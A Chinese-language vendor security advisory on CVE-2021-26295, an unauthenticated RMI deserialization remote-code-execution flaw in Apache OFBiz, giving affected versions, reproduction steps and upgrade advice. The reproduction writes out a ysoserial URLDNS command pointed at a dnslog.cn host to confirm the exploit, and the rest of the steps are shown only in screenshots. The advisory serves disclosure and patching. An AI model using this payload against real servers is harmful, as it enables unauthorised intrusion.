## 01 漏洞概述

Apache OFBiz是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。

近日，Apache OFBiz官方发布安全更新。Apache OFBiz
存在RMI反序列化前台命令执行，未经身份验证的攻击者可以使用此漏洞来成功接管Apache OFBiz，建议相关用户尽快测试漏洞修复的版本并及时升级。

## 02 影响范围

【漏洞等级】 严重

【漏洞编号】

CVE-2021-26295

【影响版本】

Apache OFBiz < 17.12.06

## 03 漏洞复现

（1）docker搭建漏洞环境

![v2-dcb7d7b543103e15edd2f8c9b44cc1b6_720w.png](https://image.3001.net/images/20210401/1617242517_606529957df8ef753fe40.png!small)

（2）DNSLOG平台Get SubDomain，用ysoserial的URLDNS利用链生成文件

java -jar ysoserial.jar URLDNS http://isnrvo.dnslog.cn > dns.ot

（3）使用python脚本将生成的文件解码转换成hex

![v2-f9817c39171c18f6188ab4e12c19442f_720w.png](https://image.3001.net/images/20210401/1617242517_60652995d7d3342e26059.png!small)

（4）利用转换后的hex代码，构造数据包发送请求

![v2-940bb54bccb7d3c702ce0cf5826b6840_720w.png](https://image.3001.net/images/20210401/1617242518_6065299660b70bef9c782.png!small)

（5）DNSLOG平台检验执行结果

![v2-1c3d6e3d86ace7dbf733cf0368ab43bb_720w.png](https://image.3001.net/images/20210401/1617242518_60652996df8cafbdf5f1a.png!small)

可以看到，DNSLOG平台收到响应，服务器执行代码成功！

## 04 修复方案

华云安建议广大用户及时检查相关软件版本（可打开[OFBIZ_HOME/README] 文件, 查找Welcome to Apache OFBiz
xxxx字样信息确定版本），将Apacge OFBiz升级到最新版本。

【参考链接】

Apache OFBiz 官方：https://ofbiz.apache.org/release-notes-17.12.06.html

【补丁信息】

补丁名称：Apache OFBiz 远程代码执行漏洞补丁

补丁链接：https://ofbiz.apache.org/download.html#vulnerabilities

## 产品解决与支持

华云安灵洞威胁与漏洞管理平台（Ai.Vul）已经支持一键检测该漏洞。

![v2-3ec4771f92a4b2a3e34276d5969387ec_720w.png](https://image.3001.net/images/20210401/1617242519_606529974f5bc559e1269.png!small)

![v2-80006f1ed7d5134c5631a5c4ccd6ebb7_720w.png](https://image.3001.net/images/20210401/1617242519_60652997a1d8dd9b1f3e8.png!small)

进入华云安漏洞情报平台了解该漏洞更多详情：https://vti.huaun.com/watchVul?warnId=7afa282099b54587b0079115069260c9

![v2-dd761bd95eb10ec0bcaab80a75883b59_720w.png](https://image.3001.net/images/20210401/1617242519_60652997f0fa60076105c.png!small)

  

